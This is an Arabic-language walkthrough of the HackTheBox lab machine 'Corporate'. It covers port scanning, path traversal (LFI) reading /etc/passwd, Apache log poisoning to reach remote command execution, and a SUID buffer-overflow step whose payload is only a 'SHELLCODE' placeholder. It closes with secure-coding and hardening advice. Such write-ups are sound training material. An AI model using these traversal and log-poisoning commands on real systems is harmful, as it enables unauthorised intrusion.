🏴‍☠️ HackTheBox "Corporate" Writeup & Methodology

تحليل متكامل لآلة Corporate المصنفة بمستوى Hard — من الفحص الأولي واكتشاف الثغرات الأمنية المترابطة إلى الحصول على صلاحيات root

🛠️ Nmap · Gobuster · Burp Suite · LinPEAS · gdb 📋 Difficulty: Hard | OS: Linux Focus: Web RCE & Pivoting

📚 المنهجية والنظرية — محاكاة بيئات الشركات

تمثل آلة Corporate محاكاة حقيقية لبيئات الشركات حيث توجد خوادم ويب متصلة بقواعد بيانات داخلية وخدمات مشاركة ملفات، مع استخدام أنظمة جدران الحماية (WAF) لحظر الهجمات المباشرة.

  • أهمية الترابط (Chaining): في بيئة العمل الحقيقية، نادراً ما تمنحك ثغرة واحدة وصولاً مباشراً لصلاحيات المسؤول. يحتاج المخترق لربط ثغرات متعددة (مثل: تسريب معلومات → تخطي حماية → استغلال ثغرة رفع ملفات).
  • الأهداف الرئيسية للسيناريو:
    1. فحص المنافذ واكتشاف المنافذ غير التقليدية.
    2. كشف مسارات الويب المخفية والتطبيقات المهملة.
    3. الحصول على Reverse Shell وتخطى قيود الـ Sandbox.
    4. البحث عن الكلمات السرية المخزنة في الـ Memory أو ملفات الإعدادات وتصعيد الصلاحيات.

🔬 تشريح مسار الحل خطوة بخطوة

1️⃣
Phase 1: Active Reconnaissance & Port Scan

البدء بفحص جميع المنافذ المفتوحة ومعرفة إصدارات الخدمات لتحديد الثغرات العامة المعروفة.

# Fast scan to find open ports nmap -p- --min-rate 5000 -oN init_scan.txt corporate.htb # Targeted scan for open ports (80, 443, 8080) nmap -p 80,443,8080 -sC -sV -oN full_scan.txt corporate.htb
2️⃣
Phase 2: Directory Brute-Force & Web Vulnerability

استخدام أدوات المسح لاكتشاف لوحة تحكم إدارية قديمة على المنفذ 8080، والعثور على ثغرة LFI (Local File Inclusion) في معالج الملفات.

# Fuzzing directories on port 8080 gobuster dir -u http://corporate.htb:8080/ -w /usr/share/wordlists/dirb/common.txt # Exploit LFI payload to read local configuration files curl "http://corporate.htb:8080/view.php?file=../../../../etc/passwd"
3️⃣
Phase 3: Log Poisoning to RCE & Initial Shell

استغلال ثغرة LFI لحقن كود PHP خبيث داخل ملف الـ Access Log الخاص بخادم Apache، ومن ثم تشغيل الأوامر عن بعد (Remote Code Execution).

# Inject PHP payload into User-Agent header curl -H "User-Agent: " http://corporate.htb:8080/ # Trigger RCE via LFI accessing the log file curl "http://corporate.htb:8080/view.php?file=../../../../var/log/apache2/access.log&cmd=id"
4️⃣
Phase 4: Privilege Escalation to Root

بعد الحصول على اتصال Reverse Shell، نقوم بتشغيل أداة LinPEAS واكتشاف ملف ثنائي (Binary) بصلاحيات SUID يحتوي على ثغرة Buffer Overflow.

# Find SUID files find / -perm -4000 -type f 2>/dev/null # Exploit SUID buffer overflow using python pattern to generate core dump python -c 'print("A" * 128 + "\x90" * 20 + "SHELLCODE")' | /usr/local/bin/custom_suid_app

🛡️ الحماية والدفاع — معالجة الثغرات المكتشفة

✅ حماية الكود البرمجي (Secure Coding)

منع ثغرات LFI عن طريق تجنب تمرير مسارات الملفات من مُدخلات المستخدم مباشرة، واستخدام قوائم بيضاء (Whitelists): 

// ❌ BAD:
include($_GET['file']);

// ✅ GOOD:
$allowed_files = ['home', 'about', 'contact'];
$file = $_GET['file'];
if (in_array($file, $allowed_files)) {
    include("pages/" . $file . ".php");
}

🔒 تحصين الخوادم (System Hardening)

  • Least Privilege: تشغيل خادم Apache تحت حساب مستخدم غير متميز (مثل www-data) ومنع وصوله للملفات الحساسة كالسجلات العامّة للنظام.
  • ASLR & DEP: تفعيل تقنيات حماية الذاكرة على مستوى نواة النظام لحظر هجمات تخريب الذاكرة (Buffer Overflow).
